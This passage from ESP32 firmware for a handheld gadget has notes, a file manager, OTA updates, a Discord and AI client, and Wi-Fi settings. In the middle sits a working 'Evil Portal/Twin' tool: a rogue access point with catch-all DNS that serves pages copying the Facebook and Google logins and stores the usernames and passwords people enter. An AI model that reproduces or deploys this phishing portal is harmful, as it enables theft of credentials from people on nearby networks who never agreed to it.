$('s').textContent=Math.round(r.used/1024)+' KB used / '+Math.round(r.total/1024)+' KB ('+Math.round((r.total-r.used)/1024)+' KB free)';
$('p').textContent=P;var L=$('l');L.innerHTML='';
if(P!='/'){var d=el('div','r'),s=el('span',0,'.. (up)');s.onclick=function(){P=P.replace(/\/[^\/]*$/,'')||'/';ld()};d.appendChild(s);L.appendChild(d)}
r.items.forEach(function(i){var d=el('div','r'),s=el('span',0,(i.d?'[folder] ':'')+i.n+(i.d?'':'  ('+i.s+' B)'));
s.onclick=function(){i.d?(P=J(i.n),ld()):ed(J(i.n))};
var a=el('button',0,'Rename');a.onclick=function(){var n=prompt('New name',i.n);if(n)A('/api/mv?p='+encodeURIComponent(J(i.n))+'&to='+encodeURIComponent(J(n))).then(ld)};
var b=el('button','d','Delete');b.onclick=function(){if(confirm('Delete '+i.n+'?'))A('/api/rm?p='+encodeURIComponent(J(i.n))).then(ld)};
d.appendChild(s);d.appendChild(a);d.appendChild(b);L.appendChild(d)})}
function mk(f){var n=prompt(f?'Folder name':'File name (e.g. todo.txt)');if(!n)return;
if(f)A('/api/mkdir?p='+encodeURIComponent(J(n))).then(ld);else A('/api/put?p='+encodeURIComponent(J(n)),'').then(function(){ld();ed(J(n))})}
async function ed(f){E=f;$('t').value=await(await fetch('/api/get?p='+encodeURIComponent(f))).text();$('en').textContent=f;$('e').style.display='block'}
function sv(){A('/api/put?p='+encodeURIComponent(E),$('t').value).then(function(){alert('Saved');ld()})}
function cl(){$('e').style.display='none'}
async function up(){var F=$('f').files;for(var i=0;i<F.length;i++){var d=new FormData();d.append('file',F[i],F[i].name);await fetch('/api/up?p='+encodeURIComponent(P),{method:'POST',body:d})}$('f').value='';ld()}
ld()
</script></body></html>)rawliteral";

String baseName(const String &n) { int i = n.lastIndexOf('/'); return n.substring(i + 1); }
String parentDir(const String &p) { int i = p.lastIndexOf('/'); return i <= 0 ? String("/") : p.substring(0, i); }
String joinPath(const String &d, const String &n) { return (d == "/" ? String("") : d) + "/" + n; }
String cleanPath(String p) {
  p.trim(); if (!p.startsWith("/")) p = "/" + p;
  while (p.indexOf("//") >= 0) p.replace("//", "/");
  if (p.length() > 1 && p.endsWith("/")) p.remove(p.length() - 1);
  if (p.indexOf("..") >= 0) p = "/";
  return p;
}
String jsonEsc(const String &s) {
  String o;
  for (unsigned i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '"' || c == '\\') { o += '\\'; o += c; } else if ((uint8_t)c < 32) o += ' '; else o += c;
  }
  return o;
}
bool rmrf(const String &path) {
  File f = LittleFS.open(path);
  if (!f) return false;
  if (!f.isDirectory()) { f.close(); return LittleFS.remove(path); }
  std::vector<String> kids;
  File c = f.openNextFile();
  while (c) { kids.push_back(baseName(String(c.name()))); c = f.openNextFile(); }
  f.close();
  for (size_t i = 0; i < kids.size(); i++) rmrf(joinPath(path, kids[i]));
  return LittleFS.rmdir(path);
}

void hRoot() { server.send_P(200, "text/html", PAGE); }
void hLs() {
  String p = cleanPath(server.arg("p")); File d = LittleFS.open(p);
  if (!d || !d.isDirectory()) { server.send(404, "text/plain", "not found"); return; }
  String dirs, files;
  File f = d.openNextFile();
  while (f) {
    String j = "{\"n\":\"" + jsonEsc(baseName(String(f.name()))) + "\",\"d\":" + (f.isDirectory() ? "true" : "false") + ",\"s\":" + String((unsigned)f.size()) + "}";
    String &t = f.isDirectory() ? dirs : files; if (t.length()) t += ","; t += j;
    f = d.openNextFile();
  }
  String items = dirs; if (dirs.length() && files.length()) items += ","; items += files;
  server.send(200, "application/json", "{\"total\":" + String((unsigned)LittleFS.totalBytes()) + ",\"used\":" + String((unsigned)LittleFS.usedBytes()) + ",\"items\":[" + items + "]}");
}
void hGet() {
  String p = cleanPath(server.arg("p")); File f = LittleFS.open(p, "r");
  if (!f || f.isDirectory()) { server.send(404, "text/plain", "not found"); return; }
  server.streamFile(f, "text/plain; charset=utf-8"); f.close();
}
void hPut() {
  String p = cleanPath(server.arg("p"));
  if (p == "/") { server.send(400, "text/plain", "bad path"); return; }
  File f = LittleFS.open(p, "w");
  if (!f) { server.send(500, "text/plain", "cannot write"); return; }
  f.print(server.arg("plain")); f.close(); notesDirty = true; server.send(200, "text/plain", "ok");
}
void hMk() {
  String p = cleanPath(server.arg("p"));
  if (p == "/" || LittleFS.exists(p) || !LittleFS.mkdir(p)) { server.send(409, "text/plain", "cannot create"); return; }
  notesDirty = true; server.send(200, "text/plain", "ok");
}
void hRm() {
  String p = cleanPath(server.arg("p"));
  if (p == "/") { server.send(400, "text/plain", "bad path"); return; }
  bool ok = rmrf(p); notesDirty = true; server.send(ok ? 200 : 500, "text/plain", ok ? "ok" : "failed");
}
void hMv() {
  String a = cleanPath(server.arg("p")), b = cleanPath(server.arg("to"));
  if (a == "/" || b == "/" || LittleFS.exists(b) || !LittleFS.rename(a, b)) { server.send(409, "text/plain", "cannot rename"); return; }
  notesDirty = true; server.send(200, "text/plain", "ok");
}
void hUpload() {
  HTTPUpload &u = server.upload();
  if (u.status == UPLOAD_FILE_START) upFile = LittleFS.open(joinPath(cleanPath(server.arg("p")), baseName(u.filename)), "w");
  else if (u.status == UPLOAD_FILE_WRITE) { if (upFile) upFile.write(u.buf, u.currentSize); }
  else if (u.status == UPLOAD_FILE_END) { if (upFile) upFile.close(); notesDirty = true; }
}
const char PORTAL_PAGE_PLAIN[] PROGMEM = R"HTML(<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #4CAF50; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        input[type=submit]:hover { background: #45a049; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Network Login</h2>
        <p>Please register to access the network:</p>
        <form action="/submit" method="POST">
            <input type="text" name="f1" placeholder="Username or Email" maxlength="100" required>
            <input type="password" name="f2" placeholder="Password" maxlength="100" required>
            <input type="submit" value="Connect">
        </form>
        <div class="footer">Secure Connection</div>
    </div>
</body>
</html>)HTML";
const char PORTAL_PAGE_CARD[] PROGMEM = R"HTML(<!DOCTYPE html>
<html>
<head>
    <title>facebook.com</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #3b5998; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #3b5998; font-size: 28px; margin: 0; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #3b5998; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <p>Log in to Facebook to continue to WiFi</p>
        <form action="/submit" method="POST">
            <input type="text" name="f1" placeholder="Email or Phone" maxlength="100" required>
            <input type="password" name="f2" placeholder="Password" maxlength="100" required>
            <input type="submit" value="Log In">
        </form>
        <div class="footer">Meta © 2025</div>
    </div>
</body>
</html>)HTML";
const char PORTAL_PAGE_PLAYFUL[] PROGMEM = R"HTML(<!DOCTYPE html>
<html>
<head>
    <title>google.com</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Google Fonts (closest to Product Sans) -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">

    <style>
        body { font-family: 'Roboto', Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; font-size: 32px; font-weight: 500; font-family: 'Poppins', sans-serif; }
        .logo span:nth-child(1) { color: #4285F4; } /* G - Blue */
        .logo span:nth-child(2) { color: #EA4335; } /* o - Red */
        .logo span:nth-child(3) { color: #FBBC05; } /* o - Yellow */
        .logo span:nth-child(4) { color: #4285F4; } /* g - Blue */
        .logo span:nth-child(5) { color: #34A853; } /* l - Green */
        .logo span:nth-child(6) { color: #EA4335; } /* e - Red */
        h2 { text-align: center; font-weight: 400; color: #333; }
        
        input[type=text], input[type=password] {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;   /* more rounded */
            box-sizing: border-box;
            font-size: 14px;
            outline: none;
            transition: box-shadow 0.2s ease, border 0.2s ease;
        }
        input[type=text]:focus, input[type=password]:focus {
            border-color: #4285f4;
            box-shadow: 0 0 3px rgba(66,133,244,0.6);
        }

        input[type=submit] {
            width: 100%;
            background: #4285f4;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 4px;   /* match Google button shape */
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            margin-top: 10px;
            transition: background 0.2s ease;
        }
        input[type=submit]:hover {
            background: #357ae8;
        }

        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h2>Sign in to your Google account</h2>
        <form action="/submit" method="POST">
            <input type="text" name="f1" placeholder="Email" maxlength="100" required>
            <input type="password" name="f2" placeholder="Password" maxlength="100" required>
            <input type="submit" value="Next">
        </form>
        <div class="footer">Google LLC®</div>
    </div>
</body>
</html>)HTML";
void hPortalRoot() {
  switch (portalStyle) {
    case 1: server.send_P(200, "text/html; charset=utf-8", PORTAL_PAGE_CARD); break;
    case 2: server.send_P(200, "text/html; charset=utf-8", PORTAL_PAGE_PLAYFUL); break;
    default: server.send_P(200, "text/html; charset=utf-8", PORTAL_PAGE_PLAIN); break;
  }
}
void hPortalSubmit() {
  if (!portalOn) { server.send(503, "text/plain", "Portal is not active"); return; }
  if (portalSubmissions.size() >= PORTAL_MAX_SUBMISSIONS) {
    server.send(429, "text/plain", "Submission limit reached");
    return;
  }
  PortalSubmission submission;
  for (int i = 0; i < 2; i++) {
    String value = server.arg("f" + String(i + 1));
    if (value.length() > PORTAL_FIELD_MAX) value.remove(PORTAL_FIELD_MAX);
    submission.fields[i] = value;
  }
  portalSubmissions.push_back(submission);
  dirtyB = true;
server.send(200, "text/html; charset=utf-8", R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Logged In</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            background: #f4f4f4;
            color: #222;
        }

        .box {
            text-align: center;
            background: white;
            padding: 40px 50px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        h1 {
            margin: 0 0 10px;
            font-size: 28px;
        }

        p {
            margin: 0;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>Successfully logged in</h1>
        <p>You are now connected to the network.</p>
    </div>
</body>
</html>
)rawliteral");
}
void setupServer() {
  server.on("/", HTTP_GET, []() { if (portalOn) hPortalRoot(); else hRoot(); });
  server.on("/submit", HTTP_POST, hPortalSubmit);
  server.on("/api/ls", HTTP_GET, hLs);
  server.on("/api/get", HTTP_GET, hGet);
  server.on("/api/put", HTTP_POST, hPut);
  server.on("/api/mkdir", HTTP_POST, hMk);
  server.on("/api/rm", HTTP_POST, hRm);
  server.on("/api/mv", HTTP_POST, hMv);
  server.on("/api/up", HTTP_POST, []() { server.send(200, "text/plain", "ok"); }, hUpload);
  server.onNotFound([]() { server.sendHeader("Location", "http://192.168.1.1/"); server.send(302, "text/plain", ""); });
}
void notesStart() {
  if (notesOn) return;
  WiFi.disconnect(true); WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(IPAddress(192, 168, 1, 1), IPAddress(192, 168, 1, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID);
  WiFi.setTxPower(WIFI_TX_POWER);
  dns.start(53, "*", IPAddress(192, 168, 1, 1));
  server.begin(); notesOn = true;
}
void notesStop() {
  if (!notesOn) return;
  server.stop(); dns.stop(); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); notesOn = false;
}
bool portalStart(const String &ssid) {
  WiFi.disconnect(true); WiFi.mode(WIFI_AP);
  if (!WiFi.softAPConfig(IPAddress(192, 168, 1, 1), IPAddress(192, 168, 1, 1), IPAddress(255, 255, 255, 0)) ||
      !WiFi.softAP(ssid.c_str())) {
    WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
    return false;
  }
  WiFi.setTxPower(WIFI_TX_POWER);
  portalSsid = ssid;
  portalOn = true;
  dns.start(53, "*", IPAddress(192, 168, 1, 1));
  server.begin();
  return true;
}
void portalStop() {
  if (!portalOn) return;
  server.stop(); dns.stop(); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); portalOn = false;
}
void portalBuildLines() {
  portalLines.clear();
  if (portalSubmissions.empty()) { portalLines.push_back("No submissions yet."); portalTop = 0; return; }
  const PortalSubmission &submission = portalSubmissions[portalSubmission];
  for (int field = 0; field < 2; field++) {
    portalLines.push_back("Field " + String(field + 1) + ":");
    String line;
    const String &value = submission.fields[field];
    if (value.length() == 0) { portalLines.push_back("(empty)"); continue; }
    for (unsigned i = 0; i < value.length(); i++) {
      uint8_t c = value[i];
      if (c == '\r') continue;
      if (c == '\n') { portalLines.push_back(line); line = ""; continue; }
      if (c >= 0x80) { if (c >= 0xC0) line += '?'; continue; }
      if (c == '\t' || c < 32 || c == 127) c = ' ';
      line += (char)c;
      if (line.length() == 20) { portalLines.push_back(line); line = ""; }
    }
    if (line.length()) portalLines.push_back(line);
  }
  portalTop = 0;
}

void wrapInto(const String &t, int cols) {
  nvLines.clear(); String cur;
  for (unsigned i = 0; i < t.length() && nvLines.size() < 600; i++) {
    uint8_t c = t[i];
    if (c == '\r') continue;
    if (c == '\n') { nvLines.push_back(cur); cur = ""; continue; }
    if (c >= 0x80) { if (c >= 0xC0) c = '?'; else continue; }
    if (c == '\t') c = ' ';
    cur += (char)c;
    if ((int)cur.length() >= cols) { nvLines.push_back(cur); cur = ""; }
  }
  if (cur.length() || nvLines.empty()) nvLines.push_back(cur);
}
void openNote(const String &path) {
  nvPath = path; nvTop = 0; nvSize = 0;
  File f = LittleFS.open(path, "r"); String t;
  if (f) { nvSize = f.size(); t.reserve(imin(nvSize, 6000)); while (f.available() && t.length() < 6000) t += (char)f.read(); f.close(); }
  wrapInto(t, 20);
}

// ============================ OTA ============================
void startOTA() {
  otaMsg = "";
  if (WiFi.status() != WL_CONNECTED && !connectBestSaved(12000)) {
    otaState = OS_ERR; otaMsg = "No Wi-Fi. Connect one first."; resyncKeys(); dirtyA = dirtyB = true; return;
  }
  resyncKeys();
  ArduinoOTA.setHostname(OTA_HOSTNAME);
  if (strlen(OTA_PASSWORD)) ArduinoOTA.setPassword(OTA_PASSWORD);
  ArduinoOTA.onStart([]() { otaState = OS_UP; otaPct = 0; dirtyA = true; });
  ArduinoOTA.onProgress([](unsigned int p, unsigned int t) {
    int pct = t ? (int)((uint64_t)p * 100 / t) : 0;
    if (pct != otaPct) { otaPct = pct; dirtyA = true; extern void renderA(); renderA(); dirtyA = false; }
  });
  ArduinoOTA.onEnd([]() { otaPct = 100; otaState = OS_DONE; extern void renderA(); renderA(); });
  ArduinoOTA.onError([](ota_error_t e) {
    switch (e) {
      case OTA_AUTH_ERROR: otaMsg = "Auth failed"; break;
      case OTA_BEGIN_ERROR: otaMsg = "Begin failed"; break;
      case OTA_CONNECT_ERROR: otaMsg = "Connect failed"; break;
      case OTA_RECEIVE_ERROR: otaMsg = "Receive failed"; break;
      case OTA_END_ERROR: otaMsg = "End failed"; break;
      default: otaMsg = "Unknown error"; break;
    }
    otaState = OS_ERR; dirtyA = dirtyB = true;
  });
  ArduinoOTA.begin(); otaBegun = true; otaState = OS_READY; dirtyA = dirtyB = true;
}
void stopOTA() { if (otaBegun) { ArduinoOTA.end(); otaBegun = false; } otaState = OS_OFF; }

// ============================ PRIVATE HOME-SERVER API ============================
#define DC_MAX_DMS  30
#define DC_MAX_MSGS 12
struct DcDm { String id, name, username, last; };
DcDm dcDm[DC_MAX_DMS]; int dcN = 0, dcCur = 0;
std::vector<String> dcLines; int dcTop = 0;
String dcLastId, dcErr; bool dcWifiOwned = false; uint32_t dcLastPoll = 0, dcLastCountdown = 0;
std::vector<String> aiLines; int aiTop = 0;

String dcClean(const char *in) {
  String o; if (!in) return o;
  for (const uint8_t *p = (const uint8_t *)in; *p; p++) {
    uint8_t c = *p;
    if (c >= 0xC0) o += '?'; else if (c >= 0x80) continue; else if (c < 32) o += ' '; else o += (char)c;
  }
  return o;
}
void dcWrap(const String &s, int cols) {
  int i = 0, n = s.length();
  while (i < n) {
    int end = imin(n, i + cols);
    if (end < n) { int sp = s.lastIndexOf(' ', end); if (sp > i) end = sp; }
    dcLines.push_back(s.substring(i, end));
    i = end; while (i < n && s[i] == ' ') i++;
  }
}
bool dcEnsureWifi() {
  if (WiFi.status() == WL_CONNECTED) return true;
  if (!connectBestSaved(12000)) return false;
  dcWifiOwned = true; return true;
}
bool apiRequest(const char *method, const String &path, const String &body, String &response) {
  WiFiClientSecure cl; HTTPClient http;
  cl.setCACert(CALC_ROOT_CA);
  http.setTimeout(12000); http.useHTTP10(true);
  if (!http.begin(cl, String(CALC_API_BASE) + path)) { dcErr = "API unavailable"; return false; }
  http.addHeader("X-Calc-Key", CALC_API_KEY);
  http.addHeader("Accept", "application/json");
  int code;
  if (strcmp(method, "GET") == 0) code = http.GET();
  else { http.addHeader("Content-Type", "application/json"); code = http.POST(body); }
  if (code >= 200 && code < 300) { response = http.getString(); http.end(); return true; }
  dcErr = code < 0 ? "Network error" : "Server HTTP " + String(code);
  http.end(); return false;
}
bool dcFetchDms() {
  String response;
  if (!apiRequest("GET", "/dms", "", response)) return false;
  JsonDocument doc;
  DeserializationError e = deserializeJson(doc, response);
  if (e) { dcErr = "Bad server data"; return false; }
  dcN = 0;
  for (JsonObject item : doc["items"].as<JsonArray>()) {
    if (dcN >= DC_MAX_DMS) break;
    dcDm[dcN].id = item["id"].as<String>();
    dcDm[dcN].name = dcClean(item["name"] | "?");
    dcDm[dcN].username = dcClean(item["username"] | "");
    dcDm[dcN].last = item["last"].as<String>();
    dcN++;
  }
  return true;
}
bool dcFetchMsgs(bool keepScroll) {
  String response;
  if (!apiRequest("GET", "/dms/" + dcDm[dcCur].id + "/messages?limit=" + String(DC_MAX_MSGS), "", response)) return false;
  JsonDocument doc;
  DeserializationError e = deserializeJson(doc, response);
  if (e) { dcErr = "Bad server data"; return false; }
  JsonArray arr = doc["items"].as<JsonArray>();
  String newest = arr.size() ? arr[arr.size() - 1]["id"].as<String>() : String("");
  if (keepScroll && newest == dcLastId) return false;      // nothing new
  bool atBottom = dcTop >= (int)dcLines.size() - 8;
  dcLines.clear(); dcLastId = newest;
  for (JsonObject m : arr) {
    String who = dcClean(m["author"] | "?");
    if (who == "bot") who = "me";
    String txt = dcClean(m["content"] | "");
    if (txt.length() > 240) txt = txt.substring(0, 240) + "..";
    if ((int)(m["attachments"] | 0) > 0) txt += " [file]";
    if (txt.length() == 0) txt = "[embed]";
    dcWrap(fit(who, 8) + ": " + txt, 20);
  }
  int bottom = imax(0, (int)dcLines.size() - 8);
  dcTop = (!keepScroll || atBottom) ? bottom : imin(dcTop, bottom);
  return true;
}
bool dcSend(const String &txt) {
  String response;
  return apiRequest("POST", "/dms/" + dcDm[dcCur].id + "/messages", "{\"content\":\"" + jsonEsc(txt) + "\"}", response);
}
void dcStart() {
  if (String(CALC_API_KEY).startsWith("replace-with-")) { toast("Set API key"); return; }
  if (!dcEnsureWifi()) { resyncKeys(); toast("No known network"); return; }
  busyB("Loading your DMs..."); busyMsg("Discord", "Loading DMs");
  bool ok = dcFetchDms(); resyncKeys();
  if (!ok) { toast(dcErr); return; }
  memo[S_DCLIST] = 0; enter(S_DCLIST);
}
void dcOpen(int i) {
  dcCur = i; dcLines.clear(); dcTop = 0; dcLastId = "";
  busyB("Loading messages..."); busyMsg("Discord", fit(dcDm[i].name, 21));
  bool ok = dcFetchMsgs(false); resyncKeys();
  if (!ok) { toast(dcErr); return; }
  dcLastPoll = millis(); enter(S_DCHAT);
}
bool aiAsk(const String &prompt, String &answer) {
  String response;
  if (!apiRequest("POST", "/ai", "{\"prompt\":\"" + jsonEsc(prompt) + "\"}", response)) return false;
  JsonDocument doc;
  if (deserializeJson(doc, response)) { dcErr = "Bad server data"; return false; }
  answer = dcClean(doc["text"] | "");
  return answer.length() > 0;
}
void aiWrap(const String &text) {
  aiLines.clear(); String line;
  auto wrapLine = [&]() {
    int i = 0, n = line.length();
    while (i < n) {
      int end = imin(n, i + 20);
      if (end < n) { int sp = line.lastIndexOf(' ', end); if (sp > i) end = sp; }
      aiLines.push_back(line.substring(i, end));
      i = end; while (i < n && line[i] == ' ') i++;
    }
  };
  for (unsigned i = 0; i < text.length(); i++) {
    char c = text[i];
    if (c == '\n') { wrapLine(); line = ""; }
    else line += c;
  }
  if (line.length()) wrapLine();
  aiTop = 0;
}

// ============================ LISTS ============================
void lAdd(const String &a, const String &r, const String &info, bool lock) {
  if (lN < MAXL) { lItem[lN] = a; lRight[lN] = r; lInfo[lN] = info; lLock[lN] = lock; lN++; }
}
void lAdd3(const String &a, const String &r, const String &info) { lAdd(a, r, info, false); }

void buildList(Screen s) {
  lN = 0; lChev = false; lTitle = "";
  bool con = (WiFi.status() == WL_CONNECTED);
  switch (s) {
    case S_GAMES:
      lTitle = "Games";
      for (int i = 0; i < 5; i++) lAdd3(GAME_NAMES[i], i < 4 && best[i] ? String("Best ") + best[i] : String(""), GAME_INFO[i]);
      break;
    case S_TOOLS:
      lTitle = "Tools"; lChev = true;
      lAdd3("Notes", "", "");
      lAdd3("Time", "", "");
      lAdd3("Discord", "", "");
      lAdd3("AI", "", "");
      lAdd3("Evil Portal/Twin", "", "");
      break;
    case S_PORTAL_STYLE:
      lTitle = "Portal HTML";
      lAdd3("Generic", "", "");
      lAdd3("Facebook", "", "");
      lAdd3("Google", "", "");
      break;
    case S_DCLIST:
      lTitle = "Discord DMs";
      for (int i = 0; i < dcN; i++) lAdd3(dcDm[i].name, "", "Press = to open this chat.");
      break;
    case S_SETTINGS:
      lTitle = "Settings"; lChev = true;
      lAdd3("Wi-Fi", "", "");
      lAdd3("Saved networks", "", "");
      lAdd3("Brightness", String(briLevel + 1) + "/5", "");
      lAdd3("Auto power off", autoOff ? String(AUTO_MIN[autoOff]) + " min" : String("Never"), "");
      lAdd3("Time sync at boot", bootSync ? "On" : "Off", "");
      lAdd3("App PIN", "****", "");
      lAdd3("OTA update", "", "");
      lAdd3("About", "", "");
      lAdd3("Erase all data", "", "");
      break;
    case S_WIFI:
      lTitle = "Wi-Fi"; lChev = true;
      lAdd3("Scan networks", "", "Look for nearby networks and connect.");
      lAdd3("Add network manually", "", "Type any SSID and password, even for hidden networks.");
      if (con) lAdd3("Disconnect", "", "Turn Wi-Fi off.");
      break;
    case S_SCAN:
      lTitle = "Networks";
      for (int i = 0; i < scanN; i++)
        lAdd(scanRes[i].ssid, String(sigPct(scanRes[i].rssi)) + "%",
             String(scanRes[i].secure ? "Secured. Press = to enter the password." : "Open network. Press = to connect.") + " Signal " + scanRes[i].rssi + " dBm.",
             scanRes[i].secure);
      break;
    case S_SAVED:
      lTitle = "Saved networks";
      for (int i = 0; i < netCount(); i++) {
        String ss = netSsid(i);
        bool on = con && WiFi.SSID() == ss;
        lAdd(ss, on ? String("Connected") : (i < hardN ? String("Built-in") : String("")),
             i < hardN ? "Hardcoded in the sketch. Press = to connect." : "Press = to connect, DEL to forget.", netPass(i).length() > 0);
      }
      break;
    case S_NOTES: {
      lTitle = "Notes " + notesDir;
      if (notesDir != "/") lAdd3("..", "", "Go up one folder");
      for (int pass = 0; pass < 2; pass++) {
        File d = LittleFS.open(notesDir);
        if (!d || !d.isDirectory()) break;
        File f = d.openNextFile();
        while (f) {
          bool isD = f.isDirectory(); String n = baseName(String(f.name()));
          if ((pass == 0) == isD) {
            if (isD) lAdd3(n + "/", "", "Folder. Press = to open.");
            else lAdd3(n, fmtBytes(f.size()), "Text file, " + String((unsigned)f.size()) + " bytes. Press = to read.");
          }
          f = d.openNextFile();
        }
      }
      break;
    }
    default: break;
  }
}
void enter(Screen s) {
  Screen old = screen;
  bool oldN = (old == S_NOTES || old == S_NOTEVIEW), newN = (s == S_NOTES || s == S_NOTEVIEW);
  if (oldN && !newN) notesStop();
  if (!oldN && newN) notesStart();
  if (old == S_PORTAL && s != S_PORTAL) portalStop();
  if (old == S_OTA && s != S_OTA) stopOTA();
  // turn Wi-Fi off again when leaving Discord (only if Discord was the one that connected it)
  bool oldD = (old == S_DCLIST || old == S_DCHAT || old == S_AI), newD = (s == S_DCLIST || s == S_DCHAT || s == S_AI || s == S_TEXT);
  if (oldD && !newD && dcWifiOwned) { WiFi.disconnect(true); WiFi.mode(WIFI_OFF); dcWifiOwned = false; }
  screen = s; if (s == S_MENU) menuSel = 1; buildList(s);
  lSel = memo[s]; if (lSel >= lN) lSel = lN ? lN - 1 : 0;
  dirtyA = dirtyB = true;
}
void enterFresh(Screen s) { memo[s] = 0; enter(s); }

// ============================ TEXT INPUT ============================
void startText(TextPurpose p, const String &title, const String &init, int mx, bool mask, Screen ret) {
  tPurpose = p; tTitle = title; tBuf = init; tMax = mx; tMask = mask; tReturn = ret;
  kbOpen = false; kbPage = 0; kbWx = 0; kbWy = 0; tLastChar = 0;
  enter(S_TEXT);
}
void protectedStart(Screen target) {
  protectedApp = target;
  startText(TP_PIN_CHECK, "App PIN", "", 4, true, S_MENU);
}
char kbCell(int page, int col, int row) {
  if (row >= kbRows[page]) return 0;
  const char *r = KBP[page][row];
  if (col >= (int)strlen(r)) return 0;
  return r[col] == ' ' ? 0 : r[col];
}
void kbMove(int dx, int dy) {
  const int W = 10;
  if (dx) {
    int nx = kbWx + dx;
    if (nx < 0)          { kbPage = (kbPage + 3) % 4; kbWx = W - 5; }
    else if (nx > W - 5) { kbPage = (kbPage + 1) % 4; kbWx = 0; }
    else kbWx = nx;
    kbWy = imin(kbWy, imax(0, kbRows[kbPage] - 3));
  }
  if (dy) { int ny = kbWy + dy; if (ny >= 0 && ny <= imax(0, kbRows[kbPage] - 3)) kbWy = ny; }
}
void kbPageStep(int d) { kbPage = (kbPage + 4 + d) % 4; kbWx = 0; kbWy = 0; }
bool pinTextPurpose() { return tPurpose == TP_PIN_CHECK || tPurpose == TP_PIN_SET; }
void textType(char c) {
  if (pinTextPurpose() && !isdigit((unsigned char)c)) return;
  if ((int)tBuf.length() < tMax) { tBuf += c; tLastChar = millis(); }
}
void textBack() { if (tBuf.length()) tBuf.remove(tBuf.length() - 1); }

void textDone() {
  if (tPurpose == TP_PIN_CHECK) {
    if (tBuf != appPin) { enter(S_MENU); toast("Wrong PIN"); return; }
    if (protectedApp == S_DCLIST) dcStart();
    else { aiLines.clear(); enter(S_AI); }
    return;
  }
  if (tPurpose == TP_PIN_SET) {
    if (tBuf.length() != 4) { toast("Use 4 digits"); return; }
    for (unsigned i = 0; i < tBuf.length(); i++) if (!isDigit(tBuf[i])) { toast("Use 4 digits"); return; }
    appPin = tBuf; prefs.putString("apin", appPin); enter(S_SETTINGS); toast("PIN saved"); return;
  }
  if (tPurpose == TP_AI_MSG) {
    if (tBuf.length() == 0) { toast("Prompt is empty"); return; }
    String prompt = tBuf, answer;
    dcErr = "";
    busyB("Asking AI..."); busyMsg("AI", "Waiting for reply");
    bool ok = dcEnsureWifi() && aiAsk(prompt, answer);
    if (ok) aiWrap(answer);
    resyncKeys(); enter(S_AI); if (!ok) toast(dcErr.length() ? dcErr : String("AI failed"));
    return;
  }
  if (tPurpose == TP_PORTAL_SSID) {
    if (tBuf.length() == 0) { toast("Name is empty"); return; }
    portalSubmissions.clear();
    portalSubmission = 0;
    if (!portalStart(tBuf)) { enter(S_TOOLS); toast("Portal start failed"); return; }
    enter(S_PORTAL);
    return;
  }
  if (tPurpose == TP_DC_MSG) {
    if (tBuf.length() == 0) { toast("Message is empty"); return; }
    String m = tBuf; kbOpen = false;
    busyB("Sending..."); busyMsg("Discord", "Sending...");
    bool ok = dcEnsureWifi() && dcSend(m);
    if (ok) dcFetchMsgs(false);
    resyncKeys(); enter(S_DCHAT); toast(ok ? "Sent" : "Send failed");
    return;
  }
  if (tPurpose == TP_MANUAL_SSID) {
    if (tBuf.length() == 0) { toast("Name is empty"); return; }
    pendingSsid = tBuf;
    startText(TP_PASS, "Password: " + pendingSsid, "", 63, true, S_WIFI);
  } else {
    String s = pendingSsid, p = tBuf;
    kbOpen = false; connectWifi(s, p); enter(S_WIFI);
  }
}
void textKey(uint8_t k) {
  if (pinTextPurpose()) {
    if (k >= '0' && k <= '9') textType((char)k);
    else if (k == K_DEL || k == K_ALPHA) textBack();
    else if (k == '=') textDone();
    else if (k == K_MODE) enter(tReturn);
    return;
  }
